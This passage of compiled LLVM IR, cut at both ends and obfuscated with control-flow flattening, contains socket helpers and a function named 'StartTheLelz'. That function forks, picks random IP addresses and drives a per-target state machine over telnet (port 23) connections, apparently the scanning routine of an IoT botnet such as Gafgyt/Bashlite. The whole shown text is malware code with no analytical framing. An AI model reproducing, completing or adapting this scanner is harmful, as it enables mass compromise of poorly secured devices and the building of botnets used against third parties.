  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -152270429, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -152270429, label %first
    i32 561708174, label %7
    i32 69550266, label %8
    i32 -2016486889, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 561708174, i32 69550266
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -2016486889, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 -2016486889, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i8* @mygethostbyname(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca %struct.addrinfo, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca %struct.addrinfo*, align 8
  %8 = alloca %struct.sockaddr_in*, align 8
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %5, i32 0, i32 1
  store i32 2, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %5, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = load i8*, i8** %3, align 8
  %14 = call i32 @getaddrinfo(i8* %13, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.312, i32 0, i32 0), %struct.addrinfo* %5, %struct.addrinfo** %6)
  store i32 %14, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -318763267, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -318763267, label %first
    i32 182206972, label %17
    i32 904129421, label %18
    i32 698997063, label %20
    i32 -621510006, label %24
    i32 112771221, label %34
    i32 1460324999, label %38
    i32 444872903, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %15 = icmp ne i32 %.reload, 0
  %16 = select i1 %15, i32 182206972, i32 904129421
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %2, align 8
  store i32 444872903, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  store %struct.addrinfo* %19, %struct.addrinfo** %7, align 8
  store i32 698997063, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %22 = icmp ne %struct.addrinfo* %21, null
  %23 = select i1 %22, i32 -621510006, i32 1460324999
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %26 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %25, i32 0, i32 5
  %27 = load %struct.sockaddr*, %struct.sockaddr** %26, align 8
  %28 = bitcast %struct.sockaddr* %27 to %struct.sockaddr_in*
  store %struct.sockaddr_in* %28, %struct.sockaddr_in** %8, align 8
  %29 = load %struct.sockaddr_in*, %struct.sockaddr_in** %8, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 2
  %31 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  %33 = call i8* @inet_ntoa(i32 %32) #2
  store i8* %33, i8** %2, align 8
  store i32 444872903, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 7
  %37 = load %struct.addrinfo*, %struct.addrinfo** %36, align 8
  store %struct.addrinfo* %37, %struct.addrinfo** %7, align 8
  store i32 698997063, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  call void @freeaddrinfo(%struct.addrinfo* %39) #2
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %2, align 8
  store i32 444872903, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %2, align 8
  ret i8* %41

loopEnd:                                          ; preds = %38, %34, %24, %20, %18, %17, %first, %switchDefault
  br label %loopEntry
}

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %11 = load i8*, i8** %4, align 8
  %12 = call i8* @mygethostbyname(i8* %11)
  %13 = bitcast i8* %12 to %struct.hostent*
  store %struct.hostent* %13, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 1730478791, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1730478791, label %first
    i32 -1189090305, label %16
    i32 620073910, label %17
    i32 942663330, label %40
    i32 -433387550, label %41
    i32 -466182833, label %50
    i32 -967209462, label %51
    i32 2096174226, label %53
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %14 = icmp eq %struct.hostent* %.reload, null
  %15 = select i1 %14, i32 -1189090305, i32 620073910
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 2096174226, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.hostent*, %struct.hostent** %6, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %6, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* %22, i8* %24, i64 %28) #2
  %29 = load i16, i16* %5, align 2
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %32, align 4
  %33 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %33, i32* %9, align 4
  %34 = load i32, i32* %9, align 4
  %35 = bitcast i32* %8 to i8*
  %36 = call i32 @setsockopt(i32 %34, i32 6, i32 1, i8* %35, i32 4) #2
  %37 = load i32, i32* %9, align 4
  %38 = icmp eq i32 %37, -1
  %39 = select i1 %38, i32 942663330, i32 -433387550
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 2096174226, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %9, align 4
  %43 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %44 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %44, %struct.sockaddr** %43, align 8
  %45 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %46 = load %struct.sockaddr*, %struct.sockaddr** %45, align 8
  %47 = call i32 @connect(i32 %42, %struct.sockaddr* %46, i32 16)
  %48 = icmp eq i32 %47, -1
  %49 = select i1 %48, i32 -466182833, i32 -967209462
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 2096174226, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %9, align 4
  store i32 %52, i32* %3, align 4
  store i32 2096174226, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %3, align 4
  ret i32 %54

loopEnd:                                          ; preds = %51, %50, %41, %40, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32, i32) #0 {
  %.reg2mem135 = alloca i32
  %.reg2mem16 = alloca %struct.telstate_t*
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %24 = call i32 @fork() #2
  store i32 %24, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 455574001, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar15 = load i32, i32* %switchVar
  switch i32 %switchVar15, label %switchDefault [
    i32 455574001, label %first
    i32 -97457346, label %27
    i32 1843287828, label %28
    i32 -1763987487, label %50
    i32 -55018409, label %55
    i32 1719694217, label %69
    i32 -1192189267, label %72
    i32 1704952813, label %73
    i32 822910325, label %74
    i32 -1064572083, label %75
    i32 -1884162801, label %80
    i32 242577692, label %88
    i32 -1697257250, label %95
    i32 -1273431976, label %NodeBlock13
    i32 1571544885, label %NodeBlock11
    i32 1968098863, label %NodeBlock9
    i32 -1929388758, label %LeafBlock7
    i32 -532707121, label %NodeBlock5
    i32 -404551321, label %NodeBlock3
    i32 -542569869, label %NodeBlock1
    i32 -2135695567, label %NodeBlock
    i32 -1310136780, label %LeafBlock
    i32 -597097694, label %111
    i32 -690281049, label %120
    i32 -421002479, label %140
    i32 1300659948, label %149
    i32 298758354, label %170
    i32 1251911791, label %175
    i32 736110605, label %184
    i32 1695857728, label %189
    i32 1960540496, label %190
    i32 869257002, label %191
    i32 -1539599590, label %216
    i32 -1300972246, label %217
    i32 -1284021409, label %243
    i32 -1488730241, label %248
    i32 -354151126, label %252
    i32 663248794, label %256
    i32 -1696636813, label %257
    i32 -1541962035, label %258
    i32 -1806571743, label %267
    i32 -558173949, label %268
    i32 788129844, label %302
    i32 -2049969668, label %313
    i32 -688939774, label %317
    i32 -1708509544, label %334
    i32 -1822102817, label %335
    i32 -589790762, label %339
    i32 800295249, label %343
    i32 -270694748, label %344
    i32 1744193476, label %355
    i32 -1885170550, label %359
    i32 62120786, label %360
    i32 -655633967, label %375
    i32 1232798284, label %384
    i32 -782132112, label %388
    i32 -550747665, label %392
    i32 357410707, label %393
    i32 1455514376, label %404
    i32 -317135080, label %408
    i32 1394928743, label %409
    i32 1500334244, label %435
    i32 424685328, label %439
    i32 -1468106892, label %448
    i32 -1244624368, label %452
    i32 106229021, label %456
    i32 -1192298861, label %471
    i32 -109226799, label %480
    i32 1880168055, label %484
    i32 1088266242, label %488
    i32 1889443114, label %489
    i32 1539010158, label %500
    i32 -1892949977, label %504
    i32 -1764330795, label %505
    i32 293336789, label %531
    i32 785646434, label %535
    i32 -735119696, label %544
    i32 -61934395, label %548
    i32 -683878337, label %552
    i32 -1313717765, label %567
    i32 -1784305078, label %582
    i32 174298723, label %586
    i32 789827097, label %595
    i32 212444231, label %604
    i32 1115822193, label %608
    i32 -1388509337, label %634
    i32 871656372, label %635
    i32 2012945218, label %639
    i32 -543915230, label %640
    i32 -2038159347, label %641
    i32 -618491504, label %652
    i32 -1796773796, label %656
    i32 452506041, label %657
    i32 581875367, label %672
    i32 2124573678, label %687
    i32 1990081132, label %696
    i32 2059303184, label %711
    i32 1418191384, label %720
    i32 1079245805, label %735
    i32 -985797484, label %744
    i32 164147903, label %759
    i32 397850966, label %768
    i32 -1944219957, label %783
    i32 -1548794592, label %798
    i32 1695397765, label %810
    i32 -571175732, label %814
    i32 936548072, label %830
    i32 -1750568649, label %856
    i32 2009396334, label %867
    i32 -2099244405, label %876
    i32 -1468906459, label %899
    i32 -832619718, label %903
    i32 821280769, label %904
    i32 -118635330, label %NewDefault
    i32 1209094734, label %905
    i32 391116288, label %906
    i32 1508752584, label %909
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %25 = icmp slt i32 %.reload, 0
  %26 = select i1 %25, i32 -97457346, i32 1843287828
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  ret void

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %11, align 4
  %30 = call i64 @time(i64* null) #2
  %31 = call i32 @rand_cmwc()
  %32 = zext i32 %31 to i64
  %33 = xor i64 %30, %32
  %34 = trunc i64 %33 to i32
  call void @srand(i32 %34) #2
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = call zeroext i16 @htons(i16 zeroext 23) #13
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = call noalias i8* @malloc(i64 1025) #2
  store i8* %40, i8** %17, align 8
  %41 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 1025, i32 1, i1 false)
  %42 = load i32, i32* %11, align 4
  %43 = zext i32 %42 to i64
  %44 = call i8* @llvm.stacksave()
  store i8* %44, i8** %19, align 8
  %45 = alloca %struct.telstate_t, i64 %43, align 16
  store %struct.telstate_t* %45, %struct.telstate_t** %.reg2mem16
  %.reload134 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %46 = bitcast %struct.telstate_t* %.reload134 to i8*
  %47 = load i32, i32* %11, align 4
  %48 = sext i32 %47 to i64
  %49 = mul i64 %48, 5
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 %49, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  store i32 -1763987487, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %5, align 4
  %52 = load i32, i32* %11, align 4
  %53 = icmp slt i32 %51, %52
  %54 = select i1 %53, i32 -55018409, i32 -1192189267
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %.reload133 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload133, i64 %57
  %59 = bitcast %struct.telstate_t* %58 to i8*
  call void @llvm.memset.p0i8.i64(i8* %59, i8 0, i64 32, i32 16, i1 false)
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %.reload132 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload132, i64 %61
  %63 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %62, i32 0, i32 3
  store i8 1, i8* %63, align 1
  %64 = load i8*, i8** %17, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload131, i64 %66
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %67, i32 0, i32 9
  store i8* %64, i8** %68, align 8
  store i32 1719694217, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %5, align 4
  store i32 -1763987487, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 1704952813, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 822910325, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1064572083, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %5, align 4
  %77 = load i32, i32* %11, align 4
  %78 = icmp slt i32 %76, %77
  %79 = select i1 %78, i32 -1884162801, i32 1508752584
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %5, align 4
  %82 = sext i32 %81 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %82
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %83, i32 0, i32 7
  %85 = load i32, i32* %84, align 16
  %86 = icmp eq i32 %85, 0
  %87 = select i1 %86, i32 242577692, i32 -1697257250
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = call i64 @time(i64* null) #2
  %90 = trunc i64 %89 to i32
  %91 = load i32, i32* %5, align 4
  %92 = sext i32 %91 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %92
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %93, i32 0, i32 7
  store i32 %90, i32* %94, align 16
  store i32 -1697257250, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %97
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %98, i32 0, i32 2
  %100 = load i8, i8* %99, align 8
  %101 = zext i8 %100 to i32
  store i32 %101, i32* %.reg2mem135
  store i32 -1273431976, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload144 = load volatile i32, i32* %.reg2mem135
  %Pivot14 = icmp slt i32 %.reload144, 4
  %102 = select i1 %Pivot14, i32 -404551321, i32 1571544885
  store i32 %102, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload139 = load volatile i32, i32* %.reg2mem135
  %Pivot12 = icmp slt i32 %.reload139, 6
  %103 = select i1 %Pivot12, i32 -532707121, i32 1968098863
  store i32 %103, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload137 = load volatile i32, i32* %.reg2mem135
  %Pivot10 = icmp slt i32 %.reload137, 7
  %104 = select i1 %Pivot10, i32 -683878337, i32 -1929388758
  store i32 %104, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload136 = load volatile i32, i32* %.reg2mem135
  %SwitchLeaf8 = icmp eq i32 %.reload136, 7
  %105 = select i1 %SwitchLeaf8, i32 452506041, i32 -118635330
  store i32 %105, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload138 = load volatile i32, i32* %.reg2mem135
  %Pivot6 = icmp slt i32 %.reload138, 5
  %106 = select i1 %Pivot6, i32 106229021, i32 -1764330795
  store i32 %106, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload143 = load volatile i32, i32* %.reg2mem135
  %Pivot4 = icmp slt i32 %.reload143, 2
  %107 = select i1 %Pivot4, i32 -2135695567, i32 -542569869
  store i32 %107, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload140 = load volatile i32, i32* %.reg2mem135
  %Pivot2 = icmp slt i32 %.reload140, 3
  %108 = select i1 %Pivot2, i32 62120786, i32 1394928743
  store i32 %108, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload142 = load volatile i32, i32* %.reg2mem135
  %Pivot = icmp slt i32 %.reload142, 1
  %109 = select i1 %Pivot, i32 -1310136780, i32 -1696636813
  store i32 %109, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload141 = load volatile i32, i32* %.reg2mem135
  %SwitchLeaf = icmp eq i32 %.reload141, 0
  %110 = select i1 %SwitchLeaf, i32 -597097694, i32 -118635330
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %113
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %114, i32 0, i32 3
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 1
  %119 = select i1 %118, i32 -690281049, i32 -421002479
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %5, align 4
  %122 = sext i32 %121 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 9
  %125 = load i8*, i8** %124, align 8
  store i8* %125, i8** %20, align 8
  %126 = load i32, i32* %5, align 4
  %127 = sext i32 %126 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %127
  %129 = bitcast %struct.telstate_t* %128 to i8*
  call void @llvm.memset.p0i8.i64(i8* %129, i8 0, i64 32, i32 16, i1 false)
  %130 = load i8*, i8** %20, align 8
  %131 = load i32, i32* %5, align 4
  %132 = sext i32 %131 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 9
  store i8* %130, i8** %134, align 8
  %135 = call i32 @getDatIP()
  %136 = load i32, i32* %5, align 4
  %137 = sext i32 %136 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 1
  store i32 %135, i32* %139, align 4
  store i32 869257002, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i32, i32* %5, align 4
  %142 = sext i32 %141 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 3
  %145 = load i8, i8* %144, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 0
  %148 = select i1 %147, i32 1300659948, i32 1960540496
  store i32 %148, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %5, align 4
  %151 = sext i32 %150 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 5
  %154 = load i8, i8* %153, align 1
  %155 = add i8 %154, 1
  store i8 %155, i8* %153, align 1
  %156 = load i32, i32* %5, align 4
  %157 = sext i32 %156 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %157
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %158, i32 0, i32 4
  %160 = load i8, i8* %159, align 2
  %161 = add i8 %160, 1
  store i8 %161, i8* %159, align 2
  %162 = load i32, i32* %5, align 4
  %163 = sext i32 %162 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 5
  %166 = load i8, i8* %165, align 1
  %167 = zext i8 %166 to i64
  %168 = icmp eq i64 %167, 98
  %169 = select i1 %168, i32 298758354, i32 1251911791
  store i32 %169, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load i32, i32* %5, align 4
  %172 = sext i32 %171 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %172
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %173, i32 0, i32 3
  store i8 1, i8* %174, align 1
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i32, i32* %5, align 4
  %177 = sext i32 %176 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %177
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %178, i32 0, i32 4
  %180 = load i8, i8* %179, align 2
